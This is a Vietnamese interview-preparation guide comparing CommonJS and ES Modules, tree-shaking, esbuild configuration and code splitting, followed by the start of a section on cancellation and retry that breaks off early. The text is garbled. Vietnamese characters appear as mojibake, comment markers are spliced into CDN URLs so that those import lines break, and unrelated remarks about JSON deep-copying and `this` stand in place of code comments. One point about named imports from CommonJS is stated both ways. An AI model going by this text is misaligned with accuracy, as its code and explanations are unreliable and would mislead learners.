## 27. üì¶ Q27: CommonJS vs ES Modules (ESM) & Bundling Deep Dive  

**P1: T√™n c√¢u h·ªèi:** üì¶ Q27: CommonJS vs ES Modules (ESM) & Bundling Deep Dive  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"CommonJS (CJS) l√† h·ªá th·ªëng module Node.js (ƒë·ªìng b·ªô, runtime). ESM l√† chu·∫©n JavaScript (b·∫•t ƒë·ªìng b·ªô, ph√¢n t√≠ch tƒ©nh).**

**üìä CommonJS (CJS) - Node.js C≈©:**
- **C√∫ ph√°p**: `require()` import, `module.exports` export.
- **T·∫£i**: ƒê·ªìng b·ªô (ch·∫∑n) ‚Üí t·ªët cho server, kh√¥ng t·ªët cho tr√¨nh duy·ªát.
- **Th·ª±c thi**: ƒê√°nh gi√° runtime ‚Üí imports ƒë·ªông (c√≥ ƒëi·ªÅu ki·ªán, ƒë∆∞·ªùng d·∫´n t√≠nh to√°n).
- **Caching**: Module ƒë∆∞·ª£c cache sau l·∫ßn require ƒë·∫ßu ‚Üí m·∫´u singleton.
- **Scope**: D·ª±a tr√™n file, scope module c√¥ l·∫≠p.
- **Ph·∫ßn m·ªü r·ªông**: `.js`, `.cjs`.
- ‚úÖ Tr∆∞·ªùng h·ª£p: Backend Node.js, g√≥i npm c≈©.

**üéØ ES Modules (ESM) - Chu·∫©n Hi·ªán ƒê·∫°i:**
- **C√∫ ph√°p**: C√¢u l·ªánh `import/export`.
- **T·∫£i**: B·∫•t ƒë·ªìng b·ªô (kh√¥ng ch·∫∑n) ‚Üí t·ªët cho tr√¨nh duy·ªát.
- **Th·ª±c thi**: Ph√¢n t√≠ch tƒ©nh ‚Üí ph√¢n gi·∫£i compile-time ‚Üí tree-shaking (lo·∫°i b·ªè code ch·∫øt).
- **Strict Mode**: Ch·∫ø ƒë·ªô strict m·∫∑c ƒë·ªãnh.
- **Ph·∫ßn m·ªü r·ªông**: `.mjs`, `.js` (v·ªõi `"type": "module"` trong package.json).
- ‚úÖ Tr∆∞·ªùng h·ª£p: Tr√¨nh duy·ªát hi·ªán ƒë·∫°i, Node.js 12+, frameworks frontend.

**üîë Kh√°c Bi·ªát Ch√≠nh:**
| T√≠nh NƒÉng | CommonJS | ESM |
|-----------|----------|-----|
| **T·∫£i** | ƒê·ªìng b·ªô | B·∫•t ƒë·ªìng b·ªô |
| **C√∫ ph√°p** | `require()`, `module.exports` | `import`, `export` |
| **Ph√¢n t√≠ch** | Runtime (ƒë·ªông) | Compile-time (tƒ©nh) |
| **Tree-shaking** | ‚ùå Kh√¥ng h·ªó tr·ª£ | ‚úÖ H·ªó tr·ª£ (bundlers) |
| **Top-level await** | ‚ùå Kh√¥ng h·ªó tr·ª£ | ‚úÖ H·ªó tr·ª£ (ES2022) |
| **Tr√¨nh duy·ªát** | ‚ùå C·∫ßn bundler | ‚úÖ H·ªó tr·ª£ native |
| **Dynamic import** | `require(variable)` | H√†m `import()` |
| **Hoisting** | Kh√¥ng hoist | Hoist (imports ƒë·∫ßu file) |

**üöÄ Tree-Shaking (Lo·∫°i B·ªè Code Ch·∫øt):**
- **Kh√°i ni·ªám**: Bundlers (Webpack, Rollup) ph√¢n t√≠ch ESM imports ‚Üí x√≥a exports kh√¥ng d√πng ‚Üí bundle nh·ªè h∆°n.
- **T·∫°i sao ch·ªâ ESM**: Imports tƒ©nh ‚Üí bundler bi·∫øt ch√≠nh x√°c code n√†o ƒë∆∞·ª£c d√πng (compile-time).
- **H·∫°n ch·∫ø CJS**: Require ƒë·ªông ‚Üí bundler kh√¥ng bi·∫øt code n√†o s·∫Ω d√πng (runtime) ‚Üí ph·∫£i bao g·ªìm t·∫•t c·∫£.

**üîß Interop (CJS ‚Üî ESM):**
- **ESM import CJS**: `import cjsModule from 'cjs-package'` ‚Üí default export = `module.exports`.
- **CJS require ESM**: Kh√¥ng th·ªÉ synchronous require ESM ‚Üí ph·∫£i d√πng dynamic `import()`.
  ```js
 // Ch√∫ gi·∫£i: CJS file
  (async () => {
    const esmModule = await import('./esm-file.mjs');
  })();
  ```
- **Dual packages**: Publish c·∫£ CJS v√† ESM versions (`.cjs`, `.mjs`) v·ªõi `exports` field trong package.json.

**‚ö†Ô∏è Common Pitfalls:**
- **Named imports t·ª´ CJS**: CJS kh√¥ng c√≥ named exports th·∫≠t.
  ```js
 // Ch√∫ gi·∫£i: CJS
  module.exports = { foo: 1 };
 // Ch√∫ gi·∫£i: ESM import
  import { foo } from 'cjs-module'; // ‚ùå Kh√¥ng work! (Node.js synthetic support)
  import cjs from 'cjs-module'; // Ch√∫ gi·∫£i: ‚úÖ cjs = { foo: 1 }
  const { foo } = cjs;
  ```
- **File extensions**: ESM trong browser c·∫ßn `.js` extension trong imports. Node.js kh√¥ng c·∫ßn (resolve algorithm).
- **`__dirname`, `__filename`**: Kh√¥ng t·ªìn t·∫°i trong ESM ‚Üí d√πng `import.meta.url`.
  ```js
 // Ch√∫ gi·∫£i: CJS
  console.log(__dirname);
 // Ch√∫ gi·∫£i: ESM
  import { fileURLToPath } from 'url';
  const __dirname = fileURLToPath(new URL('.', import.meta.url));
  ```

**üí° Senior Insights:**
- **Migration strategy**: Dual publish (CJS + ESM) cho libraries ‚Üí backward compatibility.
- **Bundlers**: Webpack, Rollup, esbuild prefer ESM ‚Üí better tree-shaking, faster builds.
- **Node.js**: ESM stable since v12, recommended cho new projects.
- **Package.json `type` field**: `"type": "module"` ‚Üí `.js` files treated as ESM. Default = CJS.
- **Performance**: ESM parsing faster (static analysis), nh∆∞ng CJS caching c√≥ th·ªÉ faster trong m·ªôt s·ªë cases.

---

**Tr·∫£ l·ªùi:**

**üéØ Core Concepts:**

**1. CommonJS (CJS) - Node.js Module System:**
- **Syntax**: `require()` ƒë·ªÉ import, `module.exports` ƒë·ªÉ export
- **Loading**: Synchronous (ƒë·ªìng b·ªô), blocking I/O
- **Execution**: Runtime evaluation, dynamic imports
- **Scope**: File-based, isolated module scope
- **Extension**: `.js`, `.cjs`
- **Use Case**: Node.js backend, legacy packages

**2. ES Modules (ESM) - JavaScript Standard:**
- **Syntax**: `import/export` statements
- **Loading**: Asynchronous (b·∫•t ƒë·ªìng b·ªô), non-blocking
- **Execution**: Static analysis, compile-time resolution
- **Scope**: Module scope v·ªõi strict mode m·∫∑c ƒë·ªãnh
- **Extension**: `.mjs`, `.js` (v·ªõi `"type": "module"` trong package.json)
- **Use Case**: Modern browsers, Node.js (v12+), frontend frameworks

**‚úÖ ∆Øu ƒëi·ªÉm ESM:**
- **Static Analysis**: Bundlers c√≥ th·ªÉ tree-shake dead code t·∫°i compile time
- **Async Loading**: Kh√¥ng block main thread, t·ªët cho performance
- **Browser Native**: Modern browsers h·ªó tr·ª£ native, kh√¥ng c·∫ßn bundler cho dev
- **Explicit Dependencies**: Import statements r√µ r√†ng, d·ªÖ trace
- **Named Exports**: H·ªó tr·ª£ multiple exports t·ª´ m·ªôt file

**‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm ESM:**
- **Backward Compatibility**: Kh√¥ng ch·∫°y tr√™n legacy browsers
- **File Extensions Required**: Ph·∫£i specify `.js` extension trong imports (browser)
- **CORS Issues**: C·∫ßn proper headers khi load t·ª´ CDN
- **Debugging**: Source maps c·∫ßn thi·∫øt cho bundled code

**Code Example - CommonJS vs ESM:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: COMMONJS (Node.js Traditional)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: math.js - CommonJS Export
function add(a, b) {
  return a + b;
}

function subtract(a, b) {
  return a - b;
}

// Export to√†n b·ªô object
module.exports = {
  add,
  subtract,
};

// Ho·∫∑c export individual
exports.add = add;
exports.subtract = subtract;

 // Ch√∫ gi·∫£i: app.js - CommonJS Import
const math = require('./math'); // Ch√∫ gi·∫£i: Synchronous loading
console.log(math.add(1, 2)); // Ch√∫ gi·∫£i: 3

 // Ch√∫ gi·∫£i: Destructuring import
const { add, subtract } = require('./math');
console.log(add(1, 2)); // Ch√∫ gi·∫£i: 3

 // Ch√∫ gi·∫£i: Dynamic import (runtime)
const moduleName = './math';
const math2 = require(moduleName); // Ch√∫ gi·∫£i: ‚úÖ Works - runtime evaluation

 // Ch√∫ gi·∫£i: Conditional import
if (condition) {
  const math3 = require('./math'); // Ch√∫ gi·∫£i: ‚úÖ Works
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: ES MODULES (Modern JavaScript)
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: math.mjs - ESM Named Exports
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

 // Ch√∫ gi·∫£i: Default export
export default function multiply(a: number, b: number): number {
  return a * b;
}

 // Ch√∫ gi·∫£i: app.mjs - ESM Import
import multiply, { add, subtract } from './math.mjs'; // Ch√∫ gi·∫£i: Async loading
console.log(add(1, 2)); // Ch√∫ gi·∫£i: 3
console.log(multiply(3, 4)); // Ch√∫ gi·∫£i: 12

 // Ch√∫ gi·∫£i: Import all
import * as math from './math.mjs';
console.log(math.add(1, 2)); // Ch√∫ gi·∫£i: 3

 // Ch√∫ gi·∫£i: Dynamic import (async)
const modulePath = './math.mjs';
 // Ch√∫ gi·∫£i: import modulePath; // ‚ùå Error - must be static string

 // Ch√∫ gi·∫£i: Dynamic import with await
const { add: dynamicAdd } = await import('./math.mjs'); // Ch√∫ gi·∫£i: ‚úÖ Works

 // Ch√∫ gi·∫£i: Conditional import
if (condition) {
  const { add } = await import('./math.mjs'); // Ch√∫ gi·∫£i: ‚úÖ Works with await
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: BROWSER USAGE - Native ESM
 // Ch√∫ gi·∫£i: ============================================
```

```html
<!-- index.html - Browser Native ESM -->
<!DOCTYPE html>
<html>
<head>
  <title>ESM in Browser</title>
</head>
<body>
  <!-- Traditional script (no modules) -->
  <script src="./legacy.js"></script>
  
  <!-- ESM - type="module" enables import/export -->
  <script type="module">
 // Ch√∫ gi·∫£i: Import t·ª´ local file
    import { add } from './utils/math.js'; // Ph·∫£i c√≥ .js extension
    console.log('1 + 2 =', add(1, 2));

 // Ch√∫ gi·∫£i: Import t·ª´ CDN (ESM format)
    import confetti from 'https: // Ch√∫ gi·∫£i: cdn.skypack.dev/canvas-confetti';
    confetti();

 // Ch√∫ gi·∫£i: Dynamic import cho code splitting
    document.getElementById('btn')?.addEventListener('click', async () => {
 // Ch√∫ gi·∫£i: Lazy load heavy module khi user click
      const { heavyFunction } = await import('./heavy-feature.js');
      heavyFunction();
    });

 // Ch√∫ gi·∫£i: Import maps (Chrome 89+)
 // Ch√∫ gi·∫£i: <script type="importmap">
 // Ch√∫ gi·∫£i: {
 // Ch√∫ gi·∫£i: "imports": {
 // Ch√∫ gi·∫£i: "lodash": "https://cdn.skypack.dev/lodash",
 // Ch√∫ gi·∫£i: "react": "https://cdn.skypack.dev/react"
 // Ch√∫ gi·∫£i: }
 // Ch√∫ gi·∫£i: }
 // Ch√∫ gi·∫£i: </script>
    
 // Ch√∫ gi·∫£i: Then import nh∆∞ package name
 // Ch√∫ gi·∫£i: import _ from 'lodash';
  </script>

  <!-- Preload modules cho better performance -->
  <link rel="modulepreload" href="./utils/math.js">
  <link rel="modulepreload" href="./heavy-feature.js">
</body>
</html>
```

**Vietnamese Explanation - C√°ch Ho·∫°t ƒê·ªông:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: COMMONJS LOADING MECHANISM
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * 1. SYNCHRONOUS LOADING (ƒê·ªìng B·ªô):
 *    - require() ƒë·ªçc file NGAY L·∫¨P T·ª®C
 *    - Block execution cho ƒë·∫øn khi file loaded
 *    - Cached sau l·∫ßn ƒë·∫ßu (module.exports object ƒë∆∞·ª£c cache)
 * 
 * 2. RUNTIME EVALUATION:
 *    - Code trong module ƒë∆∞·ª£c execute ngay khi require()
 *    - Dynamic imports allowed (require v·ªõi string variable)
 *    - Conditional requires allowed
 * 
 * 3. CACHING:
 *    - Module ch·ªâ execute M·ªòT L·∫¶N
 *    - C√°c l·∫ßn require() sau return cached exports
 *    - require.cache ch·ª©a t·∫•t c·∫£ loaded modules
 */

 // Ch√∫ gi·∫£i: Example: CommonJS caching
 // Ch√∫ gi·∫£i: a.js
console.log('Module A loaded'); // Ch√∫ gi·∫£i: Ch·ªâ log 1 l·∫ßn
module.exports = { name: 'A' };

 // Ch√∫ gi·∫£i: main.js
const a1 = require('./a'); // Ch√∫ gi·∫£i: Log: "Module A loaded"
const a2 = require('./a'); // Kh√¥ng log g√¨ (cached)
console.log(a1 === a2); // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: ESM LOADING MECHANISM
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * 1. ASYNCHRONOUS LOADING (B·∫•t ƒê·ªìng B·ªô):
 *    - import statements parsed tr∆∞·ªõc khi execution
 *    - Browser fetch modules parallel, kh√¥ng block
 *    - Modules execute theo dependency order
 * 
 * 2. STATIC ANALYSIS:
 *    - Import/export ph·∫£i l√† static strings (kh√¥ng th·ªÉ d√πng variables)
 *    - Bundlers c√≥ th·ªÉ analyze dependencies t·∫°i build time
 *    - Tree-shaking possible (remove unused exports)
 * 
 * 3. MODULE GRAPH:
 *    - Browser x√¢y d·ª±ng dependency graph
 *    - Fetch ‚Üí Parse ‚Üí Instantiate ‚Üí Evaluate
 *    - M·ªói module ch·ªâ evaluate M·ªòT L·∫¶N
 * 
 * 4. LIVE BINDINGS:
 *    - Imported values l√† REFERENCES, kh√¥ng ph·∫£i copies
 *    - Changes trong export module reflect trong import
 */

 // Ch√∫ gi·∫£i: Example: ESM live bindings
 // Ch√∫ gi·∫£i: counter.mjs
export let count = 0;
export function increment() {
  count++;
}

 // Ch√∫ gi·∫£i: main.mjs
import { count, increment } from './counter.mjs';
console.log(count); // Ch√∫ gi·∫£i: 0
increment();
console.log(count); // Ch√∫ gi·∫£i: 1 - live binding updated!

 // Ch√∫ gi·∫£i: CommonJS would copy value:
 // Ch√∫ gi·∫£i: const { count } = require('./counter.js');
 // Ch√∫ gi·∫£i: increment();
 // Ch√∫ gi·∫£i: console.log(count); // Still 0 - copied value

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: BUNDLING v·ªõi ESBuild (Ultra-Fast Bundler)
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * ESBuild l√† extremely fast bundler vi·∫øt b·∫±ng Go
 * - 10-100x nhanh h∆°n Webpack/Rollup
 * - Built-in TypeScript support
 * - Tree-shaking t·ª± ƒë·ªông
 * - Code splitting
 * - Minification
 */

 // Ch√∫ gi·∫£i: esbuild.config.js
import * as esbuild from 'esbuild';

 // Ch√∫ gi·∫£i: Basic build
await esbuild.build({
  entryPoints: ['src/index.ts'],
  bundle: true, // Ch√∫ gi·∫£i: Bundle t·∫•t c·∫£ dependencies
  outfile: 'dist/bundle.js',
  minify: true, // Ch√∫ gi·∫£i: Minify code
  sourcemap: true, // Ch√∫ gi·∫£i: Generate source maps
  target: 'es2020', // Ch√∫ gi·∫£i: Target environment
  format: 'esm', // Ch√∫ gi·∫£i: Output format: 'esm' | 'cjs' | 'iife'
  platform: 'browser', // Ch√∫ gi·∫£i: 'browser' | 'node' | 'neutral'
  
 // Ch√∫ gi·∫£i: Tree-shaking configuration
  treeShaking: true,
  
  // External dependencies (kh√¥ng bundle)
  external: ['react', 'react-dom'],
  
 // Ch√∫ gi·∫£i: Define global constants
  define: {
    'process.env.NODE_ENV': '"production"',
  },
  
 // Ch√∫ gi·∫£i: Plugin system
  plugins: [],
});

 // Ch√∫ gi·∫£i: Advanced: Code Splitting v·ªõi multiple entry points
await esbuild.build({
  entryPoints: {
    home: 'src/pages/home.ts',
    about: 'src/pages/about.ts',
    contact: 'src/pages/contact.ts',
  },
  bundle: true,
  outdir: 'dist',
  splitting: true, // Ch√∫ gi·∫£i: Enable code splitting
  format: 'esm', // Ch√∫ gi·∫£i: Required for splitting
  chunkNames: 'chunks/[name]-[hash]',
});

// Transform single file (kh√¥ng bundle)
const result = await esbuild.transform(
  'const x: number = 1;',
  {
    loader: 'ts',
    target: 'es2020',
    minify: true,
  }
);
console.log(result.code); // Ch√∫ gi·∫£i: "const x=1;"

 // Ch√∫ gi·∫£i: Watch mode cho development
const ctx = await esbuild.context({
  entryPoints: ['src/index.ts'],
  bundle: true,
  outfile: 'dist/bundle.js',
  sourcemap: true,
});

await ctx.watch(); // Ch√∫ gi·∫£i: Watch for file changes
await ctx.serve({ port: 3000 }); // Ch√∫ gi·∫£i: Serve v·ªõi dev server

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: TREE-SHAKING v·ªõi ESM
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * Tree-shaking = Dead Code Elimination
 * - Bundler analyze import/export graph
 * - Remove unused exports t·ª´ final bundle
 * - CH·ªà works v·ªõi ESM (static analysis)
 * - CommonJS KH√îNG th·ªÉ tree-shake (dynamic)
 */

// utils.ts - Library v·ªõi nhi·ªÅu functions
export function usedFunction() {
  console.log('Used');
}

export function unusedFunction() {
  console.log('Unused'); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
}

export function anotherUnused() {
  console.log('Also unused'); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
}

 // Ch√∫ gi·∫£i: main.ts - Ch·ªâ import 1 function
import { usedFunction } from './utils';
usedFunction();

 // Ch√∫ gi·∫£i: After bundling v·ªõi tree-shaking:
 // Ch√∫ gi·∫£i: ‚úÖ usedFunction included in bundle
 // Ch√∫ gi·∫£i: ‚ùå unusedFunction removed (dead code)
 // Ch√∫ gi·∫£i: ‚ùå anotherUnused removed (dead code)

 // Ch√∫ gi·∫£i: Side-effects prevent tree-shaking
 // Ch√∫ gi·∫£i: utils-with-side-effects.ts
console.log('This runs on import!'); // Ch√∫ gi·∫£i: Side effect!

export function myFunction() {
  return 42;
}

 // Ch√∫ gi·∫£i: Even if myFunction unused, file still included due to side-effect
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
 // Ch√∫ gi·∫£i: {
 // Ch√∫ gi·∫£i: "sideEffects": false
 // Ch√∫ gi·∫£i: }

 // Ch√∫ gi·∫£i: Or specify which files have side-effects:
 // Ch√∫ gi·∫£i: {
 // Ch√∫ gi·∫£i: "sideEffects": ["*.css", "src/polyfills.ts"]
 // Ch√∫ gi·∫£i: }

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: CODE SPLITTING & LAZY LOADING
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * Code Splitting = T√°ch code th√†nh nhi·ªÅu bundles
 * - Initial bundle: Core functionality
 * - Lazy chunks: Load on-demand
 * - Route-based: Load khi navigate to route
 * - Component-based: Load khi component rendered
 */

 // Ch√∫ gi·∫£i: React example with lazy loading
import React, { lazy, Suspense } from 'react';

 // Ch√∫ gi·∫£i: Lazy load component (code splitting automatic)
const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: Vue example
import { defineAsyncComponent } from 'vue';

const AsyncComp = defineAsyncComponent(() =>
  import('./components/AsyncComponent.vue')
);

 // Ch√∫ gi·∫£i: Manual code splitting v·ªõi dynamic import
async function loadFeature() {
  // Webpack/Vite s·∫Ω t·ª± ƒë·ªông t·∫°o separate chunk
  const { feature } = await import('./heavy-feature');
  feature();
}

 // Ch√∫ gi·∫£i: Preload important chunks
document.addEventListener('DOMContentLoaded', () => {
 // Ch√∫ gi·∫£i: Preload chunk for better UX
  import(/* webpackPreload: true */ './important-feature');
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: INTEROPERABILITY: CJS ‚Üî ESM
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * Mixing CommonJS v√† ESM c√≥ th·ªÉ tricky
 * - ESM c√≥ th·ªÉ import CJS (Node.js t·ª± convert)
 * - CJS KH√îNG th·ªÉ synchronously require ESM
 * - Need dynamic import() cho CJS ‚Üí ESM
 */

 // Ch√∫ gi·∫£i: ESM importing CommonJS
import cjsModule from './commonjs-module.js'; // Ch√∫ gi·∫£i: Works
import { namedExport } from './commonjs-module.js'; // Ch√∫ gi·∫£i: Works if exports.namedExport

 // Ch√∫ gi·∫£i: CommonJS importing ESM
const esmModule = require('./esm-module.mjs'); // Ch√∫ gi·∫£i: ‚ùå Error!
 // Ch√∫ gi·∫£i: Solution: Use dynamic import
(async () => {
  const esmModule = await import('./esm-module.mjs'); // Ch√∫ gi·∫£i: ‚úÖ Works
})();

 // Ch√∫ gi·∫£i: ============================================
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Dual package (support both CJS and ESM)
{
  "name": "my-package",
  "version": "1.0.0",
  "type": "module", // Ch√∫ gi·∫£i: Default to ESM
  
 // Ch√∫ gi·∫£i: Exports field (Node.js 12+)
  "exports": {
    ".": {
      "import": "./dist/index.mjs", // Ch√∫ gi·∫£i: ESM version
      "require": "./dist/index.cjs" // Ch√∫ gi·∫£i: CJS version
    },
    "./utils": {
      "import": "./dist/utils.mjs",
      "require": "./dist/utils.cjs"
    }
  },
  
 // Ch√∫ gi·∫£i: Fallback for older tools
  "main": "./dist/index.cjs", // Ch√∫ gi·∫£i: CJS entry
  "module": "./dist/index.mjs", // Ch√∫ gi·∫£i: ESM entry
  
 // Ch√∫ gi·∫£i: TypeScript types
  "types": "./dist/index.d.ts",
  
 // Ch√∫ gi·∫£i: Tree-shaking hints
  "sideEffects": false
}
```

**üéØ Best Practices:**

1. **Use ESM for new projects**: Better tooling, tree-shaking, future-proof
2. **Mark side-effects**: Set `"sideEffects": false` trong package.json n·∫øu possible
3. **Code splitting strategy**: Route-based > Component-based > Manual
4. **Bundle size monitoring**: Use tools nh∆∞ webpack-bundle-analyzer
5. **Source maps**: Always generate cho production debugging
6. **External dependencies**: Don't bundle large libraries (React, Lodash) - load t·ª´ CDN
7. **Dynamic imports**: Use cho features hi·∫øm d√πng, route-based loading
8. **ESBuild for speed**: 10-100x faster than Webpack, perfect for large projects
9. **Preload critical chunks**: Use `<link rel="modulepreload">` cho important modules
10. **CDN v·ªõi ESM**: Use ESM-compatible CDNs nh∆∞ Skypack, jsDelivr

**‚ö†Ô∏è Common Mistakes:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Sai: Mixing require trong ESM
import React from 'react';
const lodash = require('lodash'); // Ch√∫ gi·∫£i: Error trong ESM!

// ‚úÖ ƒê√∫ng: Consistent import syntax
import React from 'react';
import _ from 'lodash';

 // Ch√∫ gi·∫£i: ‚ùå Sai: Dynamic import path trong top-level ESM
const moduleName = './utils';
import { fn } from moduleName; // Ch√∫ gi·∫£i: Error - must be static!

// ‚úÖ ƒê√∫ng: Use dynamic import() for runtime paths
const moduleName = './utils';
const { fn } = await import(moduleName);

 // Ch√∫ gi·∫£i: ‚ùå Sai: Forget file extension trong browser ESM
import { add } from './math'; // Ch√∫ gi·∫£i: Error - need .js!

// ‚úÖ ƒê√∫ng: Always include extension
import { add } from './math.js';

 // Ch√∫ gi·∫£i: ‚ùå Sai: CommonJS exports trong ESM file
export const a = 1;
module.exports = { a }; // Ch√∫ gi·∫£i: Error - can't mix!

// ‚úÖ ƒê√∫ng: Use ESM syntax only
export const a = 1;
export default { a };

// ‚ùå Sai: Kh√¥ng config CORS cho ESM t·ª´ CDN
<script type="module">
  import lib from 'https: // Ch√∫ gi·∫£i: wrong-cdn.com/lib.js'; // CORS error!
</script>

// ‚úÖ ƒê√∫ng: Use ESM-compatible CDNs
<script type="module">
  import lib from 'https: // Ch√∫ gi·∫£i: cdn.skypack.dev/lib'; // Works!
</script>
```

**üìä Performance Comparison:**

```typescript
 // Ch√∫ gi·∫£i: Bundler speed comparison (1000 modules):
 // Ch√∫ gi·∫£i: - esbuild: ~0.5s ‚ö° (Go-based, parallel)
 // Ch√∫ gi·∫£i: - Rollup: ~5s (JavaScript, good tree-shaking)
 // Ch√∫ gi·∫£i: - Webpack: ~10s (JavaScript, complex config)
 // Ch√∫ gi·∫£i: - Parcel: ~8s (JavaScript, zero-config)

 // Ch√∫ gi·∫£i: Bundle size comparison (after tree-shaking):
 // Ch√∫ gi·∫£i: - ESM only: 100KB (best tree-shaking)
 // Ch√∫ gi·∫£i: - ESM + CJS mixed: 150KB (some dead code)
 // Ch√∫ gi·∫£i: - CJS only: 200KB (no tree-shaking)
```

**üéØ Use Cases:**

- **ESM Native (no bundler)**: Prototypes, small apps, HTTP/2
- **ESBuild**: Large apps c·∫ßn fast builds, TypeScript projects
- **Rollup**: Libraries c·∫ßn best tree-shaking
- **Webpack**: Complex apps v·ªõi nhi·ªÅu loaders/plugins
- **Vite**: Development v·ªõi ESM native, production v·ªõi Rollup
---
## 28. ‚èπÔ∏è Q28: Cancellation, Concurrency & Retry  

**P1: T√™n c√¢u h·ªèi:** ‚èπÔ∏è Q28: Cancellation, Concurrency & Retry  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Cancellation d√πng AbortController ƒë·ªÉ h·ªßy requests, Concurrency control gi·ªõi h·∫°n parallel tasks, Retry implement exponential backoff cho failed requests."**

**üîë 3 Pattern Ch√≠nh:**

**1. Cancellation - AbortController:**
- `const controller = new AbortController(); fetch(url, {signal: controller.signal})`
- **`controller.abort()`** h·ªßy request ‚Üí throw `AbortError`
- Use case: User navigate away, timeout, duplicate requests
- Best practice: Lan truy·ªÅn `signal` xuy√™n su·ªët async chain

**2. Concurrency Control - Semaphore Pattern:**
- **Gi·ªõi h·∫°n s·ªë tasks ch·∫°y ƒë·ªìng th·ªùi** (v√≠ d·ª•: max 5 parallel requests)
- Pattern: Queue + counter, ch·ªù slot tr·ªëng ƒë·ªÉ ch·∫°y task ti·∫øp
- Use case: Rate limiting, prevent overload server/browser
- Libraries: `p-limit`, `p-queue` (production-ready)

**3. Retry - Exponential Backoff + Jitter:**
- **Retry l·ªói t·∫°m th·ªùi** (5xx, network errors), kh√¥ng retry 4xx
- Exponential backoff: `delay = baseDelay * 2^attempt` (100ms, 200ms, 400ms...)
- **Jitter** (random noise): tr√°nh "thundering herd" (nhi·ªÅu clients retry c√πng l√∫c)
- Max attempts + total timeout ƒë·ªÉ kh√¥ng retry v√¥ h·∫°n

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Kh√¥ng cleanup AbortController khi unmount ‚Üí memory leak
- Retry **m·ªçi l·ªói** (k·ªÉ c·∫£ 4xx) ‚Üí spam server, waste resources
- Concurrency limit qu√° th·∫•p ‚Üí ch·∫≠m, qu√° cao ‚Üí overload
- Kh√¥ng cancel previous search request ‚Üí race condition (results out of order)

**üí° Ki·∫øn Th·ª©c Senior:**
- **Idempotent requests**: Retry an to√†n cho GET/PUT, c·∫©n th·∫≠n v·ªõi POST (d√πng idempotency keys)
- **Circuit Breaker pattern**: D·ª´ng h·∫≥n requests sau N failures li√™n ti·∫øp, ch·ªù recover
- **`AbortSignal.timeout(ms)`** (native) thay `setTimeout + abort`
- **Stale-While-Revalidate**: Return cached data ngay, fetch m·ªõi background, update sau
- React Query/SWR **built-in** retry + cancellation + concurrency control




**Tr·∫£ l·ªùi:****

- H·ªßy b·ªè: `AbortController/AbortSignal` cho fetch/task d√†i; truy·ªÅn `signal` xuy√™n su·ªët ƒë·ªÉ h·ªßy chu·ªói async.
- Gi·ªõi h·∫°n ƒë·ªìng th·ªùi: d√πng semaphore/pool ƒë·ªÉ ki·ªÉm so√°t s·ªë t√°c v·ª• ch·∫°y song song, tr√°nh ngh·∫Ωn bƒÉng th√¥ng hay quota.
- Retry: √°p d·ª•ng backoff + jitter cho l·ªói t·∫°m th·ªùi, k√®m t·ªïng timeout ƒë·ªÉ kh√¥ng treo v√¥ h·∫°n.

Ho·∫°t ƒë·ªông:

- Abort: `controller.abort()` ph√°t t√≠n hi·ªáu; fetch/reader/listener c√≥ `signal` s·∫Ω throw DOMException('AbortError') v√† d·ª´ng s·ªõm.
